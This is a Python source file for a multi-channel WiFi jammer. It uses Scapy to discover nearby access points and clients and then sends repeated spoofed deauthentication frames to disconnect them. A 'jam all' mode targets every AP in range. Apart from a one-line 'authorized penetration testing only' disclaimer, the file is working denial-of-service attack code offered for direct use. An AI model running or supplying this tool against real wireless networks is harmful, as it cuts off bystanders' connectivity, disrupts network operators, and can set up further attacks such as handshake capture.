"""
╔══════════════════════════════════════════════════════════════════════╗
║   📶 WiFi Jammer — Multi-Channel Deauthentication Engine            ║
║                                                                      ║
║   Sends deauthentication frames across all WiFi channels to          ║
║   create targeted denial-of-service zones. Disconnects devices       ║
║   from their access points.                                         ║
║                                                                      ║
║   Features:                                                          ║
║     • Auto channel hopping (covers all 2.4GHz + 5GHz channels)      ║
║     • Target specific APs (by BSSID)                                ║
║     • Target specific clients (by MAC)                               ║
║     • Broadcast deauth (kicks everyone off an AP)                    ║
║     • Selective jamming (jam specific channels only)                  ║
║     • Signal strength monitoring during jam                          ║
║     • Auto-discovery of nearby APs                                   ║
║     • Configurable deauth rate and packet count                      ║
║     • Kill-switch (instant stop)                                     ║
║                                                                      ║
║   Requires: Monitor mode interface (airmon-ng start wlan0)           ║
║   ⚠ For authorized penetration testing only!                        ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import subprocess
import threading
import time
import re
import os
from datetime import datetime
from collections import defaultdict, deque

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, Dot11Beacon,
        Dot11Elt, Dot11ProbeResp,
        sendp, sniff, conf
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


# ═══════════════════════════════════════════════════════════════════════
# WIFI CHANNEL DEFINITIONS
# ═══════════════════════════════════════════════════════════════════════

# 2.4 GHz channels (1-14)
CHANNELS_24GHZ = list(range(1, 15))

# 5 GHz channels (common ones)
CHANNELS_5GHZ = [
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128,
    132, 136, 140, 144, 149, 153, 157, 161, 165,
]

ALL_CHANNELS = CHANNELS_24GHZ + CHANNELS_5GHZ


class AccessPoint:
    """Represents a discovered access point."""

    def __init__(self, bssid, ssid="", channel=0, signal=0, encryption=""):
        self.bssid = bssid.upper()
        self.ssid = ssid
        self.channel = channel
        self.signal = signal
        self.encryption = encryption
        self.clients = set()  # Connected client MACs
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.deauth_count = 0
        self.is_target = False

    def to_dict(self):
        return {
            "bssid": self.bssid,
            "ssid": self.ssid,
            "channel": self.channel,
            "signal": self.signal,
            "encryption": self.encryption,
            "clients": len(self.clients),
            "client_list": list(self.clients),
            "deauth_count": self.deauth_count,
            "is_target": self.is_target,
            "first_seen": self.first_seen.strftime("%H:%M:%S"),
            "last_seen": self.last_seen.strftime("%H:%M:%S"),
        }


class WiFiJammer:
    """
    Multi-channel WiFi jammer using deauthentication frames.

    Must run on a monitor-mode interface.

    Usage:
        jammer = WiFiJammer(interface="wlan0mon")
        
        # Scan for targets
        jammer.scan(duration=10)
        
        # Jam specific AP
        jammer.add_target(bssid="AA:BB:CC:DD:EE:FF")
        jammer.start()
        
        # Or jam everything
        jammer.jam_all()
    """

    def __init__(self, interface, channels=None):
        self.interface = interface
        self.channels = channels or CHANNELS_24GHZ  # Default: 2.4GHz only
        self._running = False
        self._scanning = False
        self._lock = threading.Lock()

        # Discovered APs
        self._access_points = {}  # BSSID -> AccessPoint
        self._clients = defaultdict(set)  # Client MAC -> set of AP BSSIDs

        # Targets
        self._target_aps = set()      # BSSIDs to jam
        self._target_clients = set()  # Client MACs to jam
        self._jam_all = False         # Jam everything mode

        # Configuration
        self.deauth_count = 5       # Deauth packets per burst
        self.deauth_interval = 0.1  # Seconds between bursts
        self.channel_dwell = 0.5    # Seconds per channel when hopping

        # Stats
        self._stats = {
            "packets_sent": 0,
            "channels_hopped": 0,
            "aps_found": 0,
            "clients_found": 0,
            "current_channel": 0,
        }

        # Event log
        self._events = deque(maxlen=500)

    # ═══════════════════════════════════════════════════════════════════
    # MONITOR MODE MANAGEMENT
    # ═══════════════════════════════════════════════════════════════════

    @staticmethod
    def enable_monitor_mode(interface):
        """
        Enable monitor mode on an interface.
        Returns the monitor mode interface name.
        """
        try:
            # Try airmon-ng first
            result = subprocess.run(
                ["airmon-ng", "start", interface],
                capture_output=True, text=True, timeout=15,
            )
            # Parse for monitor interface name
            output = result.stdout + result.stderr
            mon_match = re.search(r"(\w+mon)\b", output)
            if mon_match:
                return mon_match.group(1)

            # Try iw approach
            subprocess.run(
                ["ip", "link", "set", interface, "down"],
                capture_output=True, timeout=5,
            )
            subprocess.run(
                ["iw", interface, "set", "type", "monitor"],
                capture_output=True, timeout=5,
            )
            subprocess.run(
                ["ip", "link", "set", interface, "up"],
                capture_output=True, timeout=5,
            )
            return interface

        except Exception:
            return interface

    @staticmethod
    def disable_monitor_mode(interface):
        """Disable monitor mode and restore managed mode."""
        try:
            # Try airmon-ng
            subprocess.run(
                ["airmon-ng", "stop", interface],
                capture_output=True, timeout=15,
            )
        except Exception:
            try:
                base = interface.replace("mon", "")
                subprocess.run(
                    ["ip", "link", "set", interface, "down"],
                    capture_output=True, timeout=5,
                )
                subprocess.run(
                    ["iw", interface, "set", "type", "managed"],
                    capture_output=True, timeout=5,
                )
                subprocess.run(
                    ["ip", "link", "set", interface, "up"],
                    capture_output=True, timeout=5,
                )
            except Exception:
                pass

    def set_channel(self, channel):
        """Set the interface to a specific channel."""
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                capture_output=True, timeout=3,
            )
            self._stats["current_channel"] = channel
            return True
        except Exception:
            return False

    # ═══════════════════════════════════════════════════════════════════
    # AP SCANNING
    # ═══════════════════════════════════════════════════════════════════

    def scan(self, duration=10, channels=None):
        """
        Scan for nearby access points and clients.

        Args:
            duration: Scan duration in seconds
            channels: Specific channels to scan (default: all configured)
        """
        if not SCAPY_OK:
            self._log("ERROR: Scapy not available")
            return []

        self._scanning = True
        scan_channels = channels or self.channels
        self._log(f"SCANNING {len(scan_channels)} channels for {duration}s...")

        # Start channel hopping
        hop_thread = threading.Thread(
            target=self._channel_hop_loop,
            args=(scan_channels,),
            daemon=True,
        )
        hop_thread.start()

        # Sniff for beacons and probe responses
        try:
            sniff(
                iface=self.interface,
                prn=self._process_scan_packet,
                timeout=duration,
                store=0,
            )
        except Exception as e:
            self._log(f"Scan error: {e}")

        self._scanning = False
        self._stats["aps_found"] = len(self._access_points)
        self._stats["clients_found"] = len(self._clients)
        self._log(f"SCAN COMPLETE: {len(self._access_points)} APs, "
                  f"{len(self._clients)} clients")

        return self.get_access_points()

    def _process_scan_packet(self, packet):
        """Process a packet during scanning."""
        try:
            if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
                bssid = packet[Dot11].addr2
                if not bssid:
                    return

                bssid = bssid.upper()

                # Extract SSID
                ssid = ""
                if packet.haslayer(Dot11Elt):
                    elt = packet[Dot11Elt]
                    while elt:
                        if elt.ID == 0:  # SSID
                            try:
                                ssid = elt.info.decode("utf-8", errors="ignore")
                            except Exception:
                                ssid = ""
                        elif elt.ID == 3:  # Channel
                            pass
                        elt = elt.payload if hasattr(elt, 'payload') and isinstance(elt.payload, Dot11Elt) else None

                # Signal strength
                signal = 0
                if packet.haslayer(RadioTap):
                    try:
                        signal = packet[RadioTap].dBm_AntSignal
                    except Exception:
                        signal = 0

                with self._lock:
                    if bssid not in self._access_points:
                        self._access_points[bssid] = AccessPoint(
                            bssid=bssid,
                            ssid=ssid,
                            channel=self._stats["current_channel"],
                            signal=signal,
                        )
                        self._log(f"AP FOUND: {ssid} ({bssid}) CH:{self._stats['current_channel']}")
                    else:
                        ap = self._access_points[bssid]
                        ap.last_seen = datetime.now()
                        if ssid:
                            ap.ssid = ssid
                        if signal:
                            ap.signal = signal

            # Detect clients (data frames from/to APs)
            if packet.haslayer(Dot11):
                dot11 = packet[Dot11]
                # Type 2 = Data frames
                if dot11.type == 2:
                    src = dot11.addr2
                    dst = dot11.addr1
                    bssid_addr = dot11.addr3

                    if bssid_addr and src and dst:
                        bssid_upper = bssid_addr.upper()
                        if bssid_upper in self._access_points:
                            # src is a client sending to AP
                            if src.upper() != bssid_upper:
                                with self._lock:
                                    self._access_points[bssid_upper].clients.add(src.upper())
                                    self._clients[src.upper()].add(bssid_upper)

        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════
    # TARGET MANAGEMENT
    # ═══════════════════════════════════════════════════════════════════

    def add_target(self, bssid=None, client_mac=None, ssid=None):
        """
        Add a target for jamming.

        Args:
            bssid: Target AP's BSSID
            client_mac: Target client's MAC address
            ssid: Target by SSID (finds matching BSSIDs)
        """
        with self._lock:
            if bssid:
                bssid = bssid.upper()
                self._target_aps.add(bssid)
                if bssid in self._access_points:
                    self._access_points[bssid].is_target = True
                self._log(f"TARGET ADDED: AP {bssid}")

            if client_mac:
                self._target_clients.add(client_mac.upper())
                self._log(f"TARGET ADDED: Client {client_mac}")

            if ssid:
                for ap_bssid, ap in self._access_points.items():
                    if ap.ssid.lower() == ssid.lower():
                        self._target_aps.add(ap_bssid)
                        ap.is_target = True
                        self._log(f"TARGET ADDED: AP {ap.ssid} ({ap_bssid})")

    def remove_target(self, bssid=None, client_mac=None):
        """Remove a target."""
        with self._lock:
            if bssid:
                self._target_aps.discard(bssid.upper())
            if client_mac:
                self._target_clients.discard(client_mac.upper())

    def clear_targets(self):
        """Clear all targets."""
        with self._lock:
            self._target_aps.clear()
            self._target_clients.clear()
            self._jam_all = False

    # ═══════════════════════════════════════════════════════════════════
    # JAMMING ENGINE
    # ═══════════════════════════════════════════════════════════════════

    def start(self):
        """Start jamming targeted APs/clients."""
        if not SCAPY_OK:
            self._log("ERROR: Scapy not available")
            return False

        if not self._target_aps and not self._target_clients and not self._jam_all:
            self._log("ERROR: No targets set. Use add_target() or jam_all()")
            return False

        self._running = True
        self._log("JAMMER STARTED")

        # Start channel hopping
        threading.Thread(target=self._channel_hop_loop,
                         args=(self.channels,), daemon=True).start()
        # Start deauth loop
        threading.Thread(target=self._deauth_loop, daemon=True).start()

        return True

    def jam_all(self):
        """Jam ALL discovered APs (nuclear option)."""
        self._jam_all = True
        self._log("⚠ JAM ALL MODE — Targeting every AP!")
        return self.start()

    def stop(self):
        """Stop jamming immediately (kill switch)."""
        self._running = False
        self._scanning = False
        self._log("JAMMER STOPPED")

    def _channel_hop_loop(self, channels):
        """Continuously hop through WiFi channels."""
        idx = 0
        while self._running or self._scanning:
            ch = channels[idx % len(channels)]
            self.set_channel(ch)
            self._stats["channels_hopped"] += 1
            time.sleep(self.channel_dwell)
            idx += 1

    def _deauth_loop(self):
        """Main deauthentication loop."""
        while self._running:
            try:
                with self._lock:
                    targets = self._get_current_targets()

                for target in targets:
                    if not self._running:
                        break
                    self._send_deauth(
                        target["bssid"],
                        target.get("client", "FF:FF:FF:FF:FF:FF"),
                    )

                time.sleep(self.deauth_interval)

            except Exception:
                time.sleep(0.5)

    def _get_current_targets(self):
        """Build list of current deauth targets."""
        targets = []

        if self._jam_all:
            # Target all APs with broadcast deauth
            for bssid, ap in self._access_points.items():
                targets.append({"bssid": bssid, "client": "FF:FF:FF:FF:FF:FF"})
                # Also target known clients individually
                for client in list(ap.clients)[:5]:
                    targets.append({"bssid": bssid, "client": client})
        else:
            # Targeted APs
            for bssid in self._target_aps:
                targets.append({"bssid": bssid, "client": "FF:FF:FF:FF:FF:FF"})
                # Also target their clients
                if bssid in self._access_points:
                    for client in list(self._access_points[bssid].clients)[:5]:
                        targets.append({"bssid": bssid, "client": client})

            # Targeted clients
            for client_mac in self._target_clients:
                # Find which AP they're connected to
                for bssid in self._clients.get(client_mac, set()):
                    targets.append({"bssid": bssid, "client": client_mac})

        return targets

    def _send_deauth(self, bssid, client_mac):
        """Send deauthentication frames."""
        try:
            # Deauth from AP to client
            pkt1 = (
                RadioTap() /
                Dot11(
                    type=0, subtype=12,
                    addr1=client_mac,   # Destination (client or broadcast)
                    addr2=bssid,        # Source (AP)
                    addr3=bssid,        # BSSID
                ) /
                Dot11Deauth(reason=7)  # Class 3 frame from non-associated station
            )

            # Deauth from client to AP (if targeting specific client)
            if client_mac != "FF:FF:FF:FF:FF:FF":
                pkt2 = (
                    RadioTap() /
                    Dot11(
                        type=0, subtype=12,
                        addr1=bssid,        # Destination (AP)
                        addr2=client_mac,   # Source (client)
                        addr3=bssid,        # BSSID
                    ) /
                    Dot11Deauth(reason=7)
                )
                sendp([pkt1, pkt2], iface=self.interface,
                       count=self.deauth_count, inter=0.01,
                       verbose=False)
            else:
                sendp(pkt1, iface=self.interface,
                       count=self.deauth_count, inter=0.01,
                       verbose=False)

            self._stats["packets_sent"] += self.deauth_count
            if bssid in self._access_points:
                self._access_points[bssid].deauth_count += self.deauth_count

        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════
    # PUBLIC API
    # ═══════════════════════════════════════════════════════════════════

    def get_access_points(self):
        """Get all discovered access points."""
        with self._lock:
            return [ap.to_dict() for ap in sorted(
                self._access_points.values(),
                key=lambda a: a.signal,
                reverse=True,
            )]

    def get_targets(self):
        """Get current target list."""
        with self._lock:
            return {
                "aps": list(self._target_aps),
                "clients": list(self._target_clients),
                "jam_all": self._jam_all,
            }

    def get_clients(self):
        """Get all discovered clients."""
        with self._lock:
            result = []
            for mac, ap_set in self._clients.items():
                result.append({
                    "mac": mac,
                    "connected_to": list(ap_set),
                    "is_target": mac in self._target_clients,
                })
            return result

    def get_stats(self):
        """Get jammer statistics."""
        return {
            **self._stats,
            "target_aps": len(self._target_aps),
            "target_clients": len(self._target_clients),
            "jam_all": self._jam_all,
            "is_running": self._running,
        }

    def get_events(self, limit=50):
        """Get event log."""
        with self._lock:
            return list(self._events)[-limit:]

    def _log(self, msg):
        """Log an event."""
        with self._lock:
            self._events.append({
                "time": datetime.now().strftime("%H:%M:%S"),
                "message": msg,
            })
